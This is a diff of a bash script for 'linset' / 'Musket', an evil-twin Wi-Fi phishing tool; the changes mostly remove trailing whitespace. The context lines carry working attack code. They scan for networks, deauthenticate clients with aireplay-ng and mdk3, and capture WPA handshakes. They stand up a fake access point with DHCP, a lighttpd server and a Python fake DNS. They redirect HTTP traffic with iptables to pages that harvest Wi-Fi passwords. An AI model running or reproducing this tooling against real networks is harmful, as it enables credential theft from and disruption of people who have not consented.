@@ -26,7 +26,7 @@
 # Objective Function Selection handshaker                       #
 # Intro taken from ONO Netgear WPA2 Hack           	        #
 #                                                               #
-# Greetings                                                     # 
+# Greetings                                                     #
 #                                                               #
 #################################################################
 
@@ -56,8 +56,8 @@
 ##  As the web pages never functioned due to faulty php embedding inside a bash
 ##  programming matrix there is nothing really lost.
 
-##  MTeams only worked on the phishing side of the  program. All other functions are stock. 
-################ 
+##  MTeams only worked on the phishing side of the  program. All other functions are stock.
+################
 
 
 clear
@@ -107,26 +107,26 @@ fi
 
 # Make clears if the mode is normal
 function conditional_clear() {
-	
+
 	if [[ "$linset_output_device" != "/dev/stdout" ]]; then clear; fi
 }
 
 # Calculates the last revision
 #function checkupdatess {
-#	
+#
 #	revision_online="$(timeout -s SIGTERM 20 curl -L "https://sites.google.com/site/blognetenti/linset" 2>/dev/null| grep "^revision" | cut -d "=" #-f2)"
 #	if [ -z "$revision_online" ]; then
 #		echo "?">$DUMP_PATH/Irev
 #	else
 #		echo "$revision_online">$DUMP_PATH/Irev
 #	fi
-#	
+#
 #}
 
 
 # Animation of the spinner
 function spinner {
-	
+
 	local pid=$1
 	local delay=0.15
 	local spinstr='|/-\'
@@ -157,82 +157,82 @@ trap exitmode SIGINT
 # Function that cleans and leaves interfaces
 function exitmode {
         echo "  Copying data in $DUMP_PATH/data.txt file into /root/linset/alldata.txt."
-        chmod 777 $DUMP_PATH/data.txt 
+        chmod 777 $DUMP_PATH/data.txt
 	chmod 777 /root/linset/alldata.txt
- 	cat $DUMP_PATH/data.txt >> /root/linset/alldata.txt	
+ 	cat $DUMP_PATH/data.txt >> /root/linset/alldata.txt
 	echo -e "\n\n"$blanco"["$rojo" "$blanco"] "$rojo"Running cleaning and closing."$rescolor""
-	
+
 	if ps -A | grep -q aireplay-ng; then
 		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Killing "$gris"aireplay-ng"$rescolor""
 		killall aireplay-ng &>$linset_output_device
 	fi
-	
+
 	if ps -A | grep -q airodump-ng; then
 		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Killing "$gris"airodump-ng"$rescolor""
 		killall airodump-ng &>$linset_output_device
 	fi
-	
+
 	if ps a | grep python| grep fakedns; then
 		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Killing "$gris"python"$rescolor""
 		kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$linset_output_device
 	fi
-	
+
 	if ps -A | grep -q hostapd; then
 		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Killing "$gris"hostapd"$rescolor""
 		killall hostapd &>$linset_output_device
 	fi
-	 
+
 	if ps -A | grep -q lighttpd; then
 		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Killing "$gris"lighttpd"$rescolor""
 		killall lighttpd &>$linset_output_device
 	fi
-	 
+
 	if ps -A | grep -q dhcpd; then
 		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Killing "$gris"dhcpd"$rescolor""
 		killall dhcpd &>$linset_output_device
 	fi
-	
+
 	if ps -A | grep -q mdk3; then
 		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Killing "$gris"mdk3"$rescolor""
 		killall mdk3 &>$linset_output_device
 	fi
-	
+
 	if [ "$WIFI_MONITOR" != "" ]; then
 		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"stopping interface "$verde"$WIFI_MONITOR"$rescolor""
 		./airmon stop $WIFI_MONITOR &> $linset_output_device
 	fi
-	
+
 	if [ "$WIFI" != "" ]; then
 		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"stopping interface "$verde"$WIFI"$rescolor""
 		./airmon stop $WIFI &> $linset_output_device
 	fi
-	
+
 	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
 		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"restoring "$gris"ipforwarding"$rescolor""
 		echo "0" > /proc/sys/net/ipv4/ip_forward #stop ipforwarding
 	fi
-	
+
 	echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"cleaning Up "$gris"iptables"$rescolor""
 	iptables --flush
 	iptables --table nat --flush
 	iptables --delete-chain
 	iptables --table nat --delete-chain
-	
+
 	echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"restoring "$gris"tput"$rescolor""
 	tput cnorm
-	
+
 #	if [ $LINSET_DEBUG != 1 ]; then
-#		
+#
 #		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Eliminando #"$gris"archivos"$rescolor""
 #		rm -R $DUMP_PATH/* &>$linset_output_device
 #	fi
-	
+
 	echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Restarting "$gris"NetworkManager"$rescolor""
 	service restart networkmanager &> $linset_output_device &
-	
+
 	echo -e ""$blanco"["$verde"+"$blanco"] "$verde"CleanUp Process completed successfully!"$rescolor""
 	exit
-	
+
 }
 
 # Generates list of interfaces in the Script
@@ -300,7 +300,7 @@ DIALOG_WEB_BACK_FR="Pr&eacute;c&eacute;dent"
 DIALOG_WEB_LENGHT_MIN_FR="La passe dois avoir plus de 7 digits"
 DIALOG_WEB_LENGHT_MAX_FR="La passe dois avoir moins de 64 digits"
 }
-#Portugese messages web interfaces 
+#Portugese messages web interfaces
 dialog_port_fn()
 {
 DIALOG_WEB_INFO_POR="Por raz&#245;es de seguran&#231;a, digite a senha para acessar a Internet"
@@ -316,7 +316,7 @@ DIALOG_WEB_LENGHT_MAX_POR="A chave deve ser menor que 64 caracteres"
 # Displays the main message of the script
 
 function mostrarheader(){
-	
+
 	conditional_clear
 	echo -e "$verde#########################################################"
 	echo -e "$verde#                                                       #"
@@ -346,7 +346,7 @@ fi
 
 # Checks for all depencies
 function checkdependences {
-	
+
 	echo -ne "Aircrack-ng....."
 	if ! hash aircrack-ng 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -355,7 +355,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Aireplay-ng....."
 	if ! hash aireplay-ng 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -364,7 +364,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "./airmon......."
 	if ! hash ./airmon 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -373,7 +373,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Airodump-ng....."
 	if ! hash airodump-ng 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -382,7 +382,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Awk............."
 	if ! hash awk 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -391,7 +391,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Curl............"
 	if ! hash curl 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -400,7 +400,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Dhcpd..........."
 	if ! hash dhcpd 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor" (isc-dhcp-server)"
@@ -409,7 +409,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Hostapd........."
 	if ! hash hostapd 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -418,7 +418,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Iwconfig........"
 	if ! hash iwconfig 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -427,7 +427,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Lighttpd........"
 	if ! hash lighttpd 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -436,7 +436,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Macchanger......"
 	if ! hash macchanger 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -445,7 +445,7 @@ function checkdependences {
 	    echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Mdk3............"
 	if ! hash mdk3 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -454,7 +454,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Php5-cgi........"
 	if ! [ -f /usr/bin/php-cgi ]; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -463,7 +463,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Pyrit..........."
 	if ! hash pyrit 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -472,7 +472,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Python.........."
 	if ! hash python 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -481,7 +481,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Unzip..........."
 	if ! hash unzip 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -490,7 +490,7 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	echo -ne "Xterm..........."
 	if ! hash xterm 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -499,11 +499,11 @@ function checkdependences {
 		echo -e "\e[1;32mOK!"$rescolor""
 	fi
 	sleep 0.025
-	
+
 	if [ "$salir" = "1" ]; then
 	exit 1
 	fi
-	
+
 	sleep 1
 	clear
 }
@@ -519,10 +519,10 @@ fi
 
 # Banner
 if [ $LINSET_DEBUG != 1 ]; then
-	
-	echo "" 
-	sleep 0.1 && echo -e $rojo "                      _    _ _   _  ____  _____ _______"                     
-	sleep 0.1 && echo -e $rojo "                     | |  | | \ | |/ ___\/  ___|__   __|"                     
+
+	echo ""
+	sleep 0.1 && echo -e $rojo "                      _    _ _   _  ____  _____ _______"
+	sleep 0.1 && echo -e $rojo "                     | |  | | \ | |/ ___\/  ___|__   __|"
 	sleep 0.1 && echo -e $rojo "                     | |  | |  \| | |___ | |___   | |"
 	sleep 0.1 && echo -e $rojo "                     | |  | | .   |\___ \|  ___|  | |"
 	sleep 0.1 && echo -e $rojo "                     | |__| | |\  |____| | |___   | |"
@@ -533,7 +533,7 @@ if [ $LINSET_DEBUG != 1 ]; then
 	sleep 0.1 && echo -e $amarillo "          | |     / / __ \/   |"$blanco"  / /"$amarillo"|__ \ "$verde"   / / / /___ ______/ /__"
 	sleep 0.1 && echo -e $amarillo "          | | /| / / /_/ / /| |"$blanco" / /"$amarillo" __/ /"$verde"   / /_/ / __  / ___/ //_/"
 	sleep 0.1 && echo -e $amarillo "          | |/ |/ / ____/ ___ |"$blanco"/ /"$amarillo" / __/ "$verde"  / __  / /_/ / /__/ ,<"
-	sleep 0.1 && echo -e $amarillo "          |__/|__/_/   /_/  |_"$blanco"/_/"$amarillo" /____/ "$verde" /_/ /_/\__,_/\___/_/|_|" 
+	sleep 0.1 && echo -e $amarillo "          |__/|__/_/   /_/  |_"$blanco"/_/"$amarillo" /____/ "$verde" /_/ /_/\__,_/\___/_/|_|"
 	sleep 0.1 && echo ""
 	sleep 0.1 && echo ""
 	sleep 1
@@ -546,14 +546,14 @@ if [ $LINSET_DEBUG != 1 ]; then
 	sleep 1
 	echo -n "                              Latest rev."
 	tput civis
-	#checkupdatess 
+	#checkupdatess
 	spinner "$!"
 	#revision_online=$(cat $DUMP_PATH/Irev)
 	#echo -e ""$blanco" [${magenta}${revision_online}$blanco"$rescolor"]"
 	#	if [ "$revision_online" != "?" ]; then
-	#		
+	#
 	#		if [ "$revision" != "$revision_online" ]; then
-	#			
+	#
 	#			cp $0 $HOME/linset_rev-$revision.backup
 	#			curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:11.0) Gecko/20100101 Firefox/11.0" -L http://goo.gl/Y5JX7c -s -o $0
 	#			echo
@@ -562,18 +562,18 @@ if [ $LINSET_DEBUG != 1 ]; then
 	#			sleep 5
 	#			chmod +x $0
 	#			exec $0
-	#			
+	#
 	#		fi
 	#	fi
 	echo ""
 	tput cnorm
 	sleep 2
-	
+
 fi
 
 # Show info for the selected AP
 function infoap {
-	
+
 	Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
 	Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | awk '{ print $5,$6,$7 }'`
 	echo "Target AP"
@@ -609,7 +609,7 @@ function setresolution {
 		TOPLEFTBIG="-geometry 91x42+0+0"
 		TOPRIGHTBIG="-geometry 83x26-0+0"
 	}
-	
+
 	function resB {
 		# Upper left window +0+0 (size*size+position+position)
 		TOPLEFT="-geometry 92x14+0+0"
@@ -667,7 +667,7 @@ function setresolution {
 		# Bottom right window -0-0
 		BOTTOMRIGHT="-geometry 90x20-0-0" # ASOCIANDO CON... ( VENTANA ROJA )
 		TOPLEFTBIG="-geometry  100x70+0+0" # escaneando objetivos ... ( ESCANEO INICIAL )
-		TOPRIGHTBIG="-geometry 90x27-0+0"  # AIRCRACK ... ( BUSQUEDA DE KEYS ) 
+		TOPRIGHTBIG="-geometry 90x27-0+0"  # AIRCRACK ... ( BUSQUEDA DE KEYS )
 }
 
 detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
@@ -690,104 +690,104 @@ esac
 
 # Choose the interfaces to use
 function setinterface {
-	
+
 	# Catch all interfaces in monitor mode to stop them
 	KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`
-	
+
 	for monkill in ${KILLMONITOR[@]}; do
 		./airmon stop $monkill >$linset_output_device
 		echo -n "$monkill, "
 	done
-	
+
 	# Create a variable with the list of physical network interfaces
 	readarray -t wirelessifaces < <(./airmon |grep "-" | awk '{print $1}')
 	INTERFACESNUMBER=`./airmon| grep -c "-"`
-	
+
 	echo "Musket Version linset-mv1.1 for WPA Phishing"
-	echo 
+	echo
 	echo "Modified and Translated to English by chunkingz	[follow @chun__king]"
-	echo	
+	echo
 	echo "  Auto detect resolution..."
 	echo $detectedresolution
 	echo
-	
-	
+
+
 	# If there is only one wireless card
 	if [ "$INTERFACESNUMBER" -gt "0" ]; then
-		
+
 		echo "  Select the wifi device interface to employ(i.e. wlan0, wlan1 etc.):"
 		echo
 		i=0
-		
+
 		for line in "${wirelessifaces[@]}"; do
 			i=$(($i+1))
 			wirelessifaces[$i]=$line
 			echo -e "$verde""$i)"$rescolor" $line"
 		done
-		
+
 		echo -n "#? "
 		read line
 		PREWIFI=${wirelessifaces[$line]}
-		
+
 		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
 			conditional_clear
 			mostrarheader
 			setinterface
 		fi
-		
+
 		readarray -t softwaremolesto < <(./airmon check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
 		WIFIDRIVER=$(./airmon | grep "$PREWIFI" | awk '{print($(NF-2))}')
 		rmmod -f "$WIFIDRIVER" &>$linset_output_device 2>&1
-		
+
 		for molesto in "${softwaremolesto[@]}"; do
 			killall "$molesto" &>$linset_output_device
 		done
 		sleep 0.5
-		
+
 		modprobe "$WIFIDRIVER" &>$linset_output_device 2>&1
 		sleep 0.5
 		# Select an interface
 		select PREWIFI in $INTERFACES; do
 			break;
 		done
-		
+
 		WIFIMONITOR=$(./airmon start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
 		WIFI_MONITOR=$WIFIMONITOR
 		# Sets a variable to the physical interface
 		  WIFI=$PREWIFI
 		# Close does not detect anything
 	else
-		
+
 		echo Wireless did not match any cards. closing Down...
 		sleep 5
 		exitmode
 	fi
-	
+
 	vk496
-	
+
 }
 
 # Intermediary checking validity of the election and prepares the environment
 function vk496 {
-	
+
 	conditional_clear
 	CSVDB=dump-01.csv
-	
+
 	rm -rf $DUMP_PATH/*
-	
+
 	choosescan
 	selection
 }
 
 # Choose whether you want to scan all channels or a specific
 function choosescan {
-	
+
 	conditional_clear
-	
+
 	while true; do
 		conditional_clear
 		mostrarheader
-		
+
 		echo "  Select Channels to Scan with airodump-ng"
 		echo "    To halt scan and continue enter Ctrl-c"
 		echo "                                       "
@@ -799,7 +799,7 @@ function choosescan {
 		echo ""
 		case $yn in
 			1 ) Scan ; break ;;
-			2 ) Scanchan ; break ;;  
+			2 ) Scanchan ; break ;;
 			* ) echo "Unknown option. Choose again"; conditional_clear ;;
 		  esac
 	done
@@ -807,10 +807,10 @@ function choosescan {
 
 # Choose which channel / is scan if you chose that option
 function Scanchan {
-	  
+
 	conditional_clear
 	mostrarheader
-	
+
 	  echo "                                       "
 	  echo "      Select Type of Airodump-ng Channel Scan     "
 	  echo "                                       "
@@ -822,42 +822,42 @@ function Scanchan {
 	read channel_number
 	set -- ${channel_number}
 	conditional_clear
-	
+
 	rm -rf $DUMP_PATH/dump*
 	xterm $HOLD -title "Airodump-ng Scan -->  $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR
 }
 
 # Escanea toda la red
 function Scan {
-	
+
 	conditional_clear
 	xterm $HOLD -title "Airodump-ng Scan ..." $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR
 }
 
 # Choose a network of all scanned
 function selection {
-	
+
 	conditional_clear
 	mostrarheader
-	
-	
+
+
 	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`
-	
+
 	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
 		vk496 && break
 	fi
-	
+
 	linap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Clients)' | awk -F : '{print $1}'`
 	linap=`expr $linap - 1`
-	head -n $linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv 
-	tail -n +$linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv 
+	head -n $linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv
+	tail -n +$linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv
 	echo "                         List of found APs "
 	echo ""
 	echo " #      MAC                      CHAN    SECU     PWR    ESSID"
 	echo ""
 	i=0
-	
-	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
+
+	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
 		longueur=${#MAC}
 		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
 		PRIVACY=${PRIVACY:0:4}
@@ -865,11 +865,11 @@ function selection {
 			i=$(($i+1))
 			POWER=`expr $POWER + 100`
 			CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`
-			
+
 			if [ "$CLIENTE" != "" ]; then
-				CLIENTE="*" 
+				CLIENTE="*"
 			fi
-			
+
 			echo -e " ""$verde"$i")"$blanco"$CLIENTE\t""$amarillo"$MAC"\t""$verde"$CHANNEL"\t""$rojo" $PRIVACY"\t  ""$amarillo"$POWER%"\t""$verde"$ESSID""$rescolor""
 			aidlenght=$IDLENGTH
 			assid[$i]=$ESSID
@@ -899,31 +899,31 @@ function selection {
 	acouper=${#ssid}
 	fin=$(($acouper-idlength))
 	Host_SSID=${ssid:1:fin}
-	
+
 	conditional_clear
-	
+
 	askAP
 }
 
 # Select mode FakeAP
 function askAP {
-		
+
 	DIGITOS_WIFIS_CSV=`echo "$Host_MAC" | wc -m`
-	
+
 	if [ $DIGITOS_WIFIS_CSV -le 15 ]; then
 		selection && break
 	fi
-	
+
 	if [ "$(echo $WIFIDRIVER | grep -i 8187)" ]; then
 		fakeapmode="airbase-ng"
 		askauth
 	fi
-	
+
 	mostrarheader
 	while true; do
-		
+
 		infoap
-		
+
 		echo "FakeAP Type"
 		echo "                                       "
 		echo -e "      "$verde"1)"$rescolor" Hostapd ("$rojo"Recommended if device supports"$rescolor")"
@@ -939,18 +939,18 @@ function askAP {
 			3 ) selection; break ;;
 			* ) echo "Unknown choose option again"; conditional_clear ;;
 		esac
-	done 
-	
-} 
+	done
+
+}
 
 # PASS testing calculation method if you chose airbase-ng
 function askauth {
-	
+
 	conditional_clear
-	
+
 	mostrarheader
 	while true; do
-		
+
 		echo "METHOD OF PASSWORD VERIFICATION"
 		echo "                                       "
 		echo -e "      "$verde"1)"$rescolor" Capture a Handshake ("$rojo"Suggest using stock linset program "$rescolor")"
@@ -966,17 +966,17 @@ function askauth {
 			3 ) askAP; break ;;
 			* ) echo "Unavilable choose option again"; conditional_clear ;;
 		esac
-	done 
-	
-} 
+	done
+
+}
 
 function deauthforce {
-	
+
 	conditional_clear
-	
+
 	mostrarheader
 	while true; do
-		
+
 		echo "WPA HANDSHAKE CHECKS"
 		echo "                                       "
 		echo -e "      "$verde"1)"$rescolor" Strict"
@@ -992,7 +992,7 @@ function deauthforce {
 			3 ) askauth; break ;;
 			* ) echo "Unavilable choose option again"; conditional_clear ;;
 		esac
-	done 
+	done
 }
 
 ############################################### < MENU > ###############################################
@@ -1006,12 +1006,12 @@ function deauthforce {
 
 # Deauth Type to be performed
 function askclientsel {
-	
+
 	conditional_clear
-	
+
 	while true; do
 		mostrarheader
-		
+
 		echo "CAPTURE A CLIENT HANDSHAKE"
 		echo "                                       "
 		echo -e "      "$verde"1)"$rescolor" Deauth All Stations"
@@ -1027,21 +1027,21 @@ function askclientsel {
 			1 ) deauth all; break ;;
 			2 ) deauth mdk3; break ;;
 			3 ) deauth esp; break ;;
-			4 ) killall airodump-ng &>$linset_output_device; vk496; break;;    
+			4 ) killall airodump-ng &>$linset_output_device; vk496; break;;
 			5 ) exitmode; break ;;
 			* ) echo "Unavilable choose option again"; conditional_clear ;;
 		esac
-	done 
-	
+	done
+
 }
 
-# 
+#
 function deauth {
-	
+
 	conditional_clear
-	
+
 	iwconfig $WIFI_MONITOR channel $Host_CHAN
-	
+
 	case $1 in
 		all )
 			DEAUTH=deauthall
@@ -1057,47 +1057,47 @@ function deauth {
 			DEAUTH=deauthesp
 			HOST=`cat $DUMP_PATH/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
 			LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`
-			
+
 			if [ $LINEAS_CLIENTES -le 5 ]; then
 				DEAUTH=deauthall
 				capture & $DEAUTH
 				CSVDB=$Host_MAC-01.csv
 				deauth
-				
+
 			fi
-			
+
 			capture
 			for CLIENT in $HOST; do
-				Client_MAC=`echo ${CLIENT:0:17}`	
+				Client_MAC=`echo ${CLIENT:0:17}`
 				deauthesp
 			done
 			$DEAUTH
 			CSVDB=$Host_MAC-01.csv
 		;;
 	esac
-	
-	
+
+
 	deauthMENU
-	
+
 }
 
 function deauthMENU {
-	
+
 	while true; do
 		conditional_clear
 		mostrarheader
-		
+
 		echo "CAPTURE THE HANDSHAKE?"
 		echo "                                       "
-		echo -e "      "$verde"1)"$rescolor" Yes" 
+		echo -e "      "$verde"1)"$rescolor" Yes"
 		echo -e "      "$verde"2)"$rescolor" No (lauch the attack again)"
-		echo -e "      "$verde"3)"$rescolor" No (select a different attack)"  
-		echo -e "      "$verde"4)"$rescolor" Select a Different Target"  
+		echo -e "      "$verde"3)"$rescolor" No (select a different attack)"
+		echo -e "      "$verde"4)"$rescolor" Select a Different Target"
 		echo -e "      "$verde"5)"$rescolor" Exit"
 		echo " "
 		echo -n '      #> '
 		read yn
-		
+
 		case $yn in
 			1 ) checkhandshake;;
 			2 ) capture; $DEAUTH & ;;
@@ -1106,16 +1106,16 @@ function deauthMENU {
 			5 ) exitmode; break;;
 			* ) echo "Unavilable choose option again"; conditional_clear ;;
 		esac
-		
+
 	done
 }
 
 # Capture all networks
 function capture {
-	
+
 	conditional_clear
 	if ! ps -A | grep -q airodump-ng; then
-		
+
 		rm -rf $DUMP_PATH/$Host_MAC*
 		xterm $HOLD -title "Airodump-ng Client Data Capture --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
 	fi
@@ -1123,7 +1123,7 @@ function capture {
 
 # Check handshake before proceeding
 function checkhandshake {
-	
+
 	if [ "$handshakemode" = "normal" ]; then
 		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
 			killall airodump-ng &>$linset_output_device
@@ -1150,19 +1150,19 @@ function checkhandshake {
 
 # Select web interface that will be used
 function webinterface {
-	
+
 	while true; do
 		conditional_clear
 		mostrarheader
-		
+
 		infoap
 		echo
 		#echo "SELECT THE WEB INTERFACE"
 		echo
-		
+
 		#echo -e "$verde""1)"$rescolor" Neutral Web Interface"
 		#echo -e "$verde""2)"$rescolor" \e[1;31mLeave"$rescolor""
-		
+
 		echo
 		echo -n "#? "
 		#read line
@@ -1172,12 +1172,12 @@ function webinterface {
 		elif [ "$line" = "1" ]; then
 			conditional_clear
 			mostrarheader
-			
+
 			infoap
 			echo
 			# echo "SELECT LANGUAGE"
 			echo
-			
+
 			echo -e "$verde""*"$rescolor" Please Standby WPA Phishing Pages[ENG] are loading..."
 			#echo -e "$verde""1)"$rescolor" English     [ENG]"
 			#echo -e "$verde""2)"$rescolor" Spanish     [ESP]"
@@ -1185,7 +1185,7 @@ function webinterface {
 			#echo -e "$verde""4)"$rescolor" French      [FR]"
 			#echo -e "$verde""5)"$rescolor" Portuguese  [POR]"
 			#echo -e "$verde""6)"$rescolor" \e[1;31mBACK"$rescolor""
-			
+
 			echo
 			echo -n "#? "
 			#read linea
@@ -1256,7 +1256,7 @@ function webinterface {
 				continue
 			fi
 		fi
-	
+
 	done
 	preattack
 	attack
@@ -1271,8 +1271,8 @@ function preattack {
 ## file into the /tmp/linset/data folder to function. Thus a /root/linset/ folder was
 ## established. The php file also had to be rewitten to work in phishing along with the html ## pages which also failed in various ways. Thus the holdphp fuction below is not used as it
 ## didnot work. MTeams loaded the unused code into a function and did not use, to save having
-## to either erase it or REM/COMMENT out. 
-  
+## to either erase it or REM/COMMENT out.
+
 holdphp_fn()
 {
 echo "<?php
@@ -1295,7 +1295,7 @@ fclose(\$fp);
 \$intento = \"../intento\";
 
 
-// Marge all the variables with text in a single variable. 
+// Marge all the variables with text in a single variable.
 \$f_data= ''.\$key1.'';
 
 
@@ -1317,19 +1317,19 @@ fclose(\$file);
 fwrite(\$archivo,\"\n\");
 fclose(\$archivo);
 
-while(1) 
+while(1)
 {
 
 if (file_get_contents(\"\$intento\") == 2) {
 	    header(\"location:final.html\");
 	    break;
-	} 
+	}
 if (file_get_contents(\"\$intento\") == 1) {
 	    header(\"location:error.html\");
 	    unlink(\$intento);
 	    break;
 	}
-	
+
 sleep(1);
 }
 
@@ -1360,7 +1360,7 @@ option domain-name-servers $IP;
 
 range $RANG_IP.100 $RANG_IP.250;
 
-} 
+}
 " >$DUMP_PATH/dhcpd.conf
 
 # It creates the Lighttpd web server config
@@ -1373,7 +1373,7 @@ server.modules = (
   \"mod_fastcgi\",
   \"mod_redirect\",
   \"mod_rewrite\"
-) 
+)
 
 fastcgi.server = ( \".php\" => ((
 		  \"bin-path\" => \"/usr/bin/php-cgi\",
@@ -1435,7 +1435,7 @@ if __name__ == '__main__':
 
   udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   udps.bind(('',53))
-  
+
   try:
     while 1:
       data, addr = udps.recvfrom(1024)
@@ -1447,42 +1447,42 @@ if __name__ == '__main__':
     udps.close()
 " >$DUMP_PATH/fakedns
 chmod +x $DUMP_PATH/fakedns
-	
+
 }
 
 # Prepare the routing tables to set a DHCP / WEB
 function routear {
-	
+
 	ifconfig $interfaceroutear up
 	ifconfig $interfaceroutear $IP netmask 255.255.255.0
-	
+
 	route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
 	echo "1" > /proc/sys/net/ipv4/ip_forward
-	
+
 	iptables --flush
 	iptables --table nat --flush
 	iptables --delete-chain
 	iptables --table nat --delete-chain
 	iptables -P FORWARD ACCEPT
-	
+
 	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
 	iptables -t nat -A POSTROUTING -j MASQUERADE
 }
 
 # Executes the attack
 function attack {
-	
+
 	if [ "$fakeapmode" = "hostapd" ]; then
 		interfaceroutear=$WIFI
 	elif [ "$fakeapmode" = "airbase-ng" ]; then
 		interfaceroutear=at0
 	fi
-	
+
 	handshakecheck
 	nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)
-	
+
